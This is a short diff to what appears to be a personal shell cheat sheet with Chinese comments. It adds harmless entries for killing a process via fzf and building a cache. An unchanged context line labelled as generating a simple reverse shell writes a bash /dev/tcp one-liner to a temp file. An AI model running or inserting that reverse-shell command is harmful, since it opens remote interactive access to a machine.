@@ -20,6 +20,9 @@ ef <path_or_null>
 # 获取当前的 wan_ip 保存到环境变量 WAN_IP 中
 wan_ip
 
+# 通过 fzf 中结进程
+fkill
+
 # 生成一个简单的反弹shell
 ;echo "bash -i >& /dev/tcp/$LOCAL_IP/443 0>&1" > /tmp/temp_bash
 bash_shell
@@ -38,3 +41,6 @@ whence -f <function_name>
 
 # 解决 windows 下没有 pip 的问题
 python -m ensurepip
+
+# 生成 navi 以及其他应用程序的 cache
+make-cache
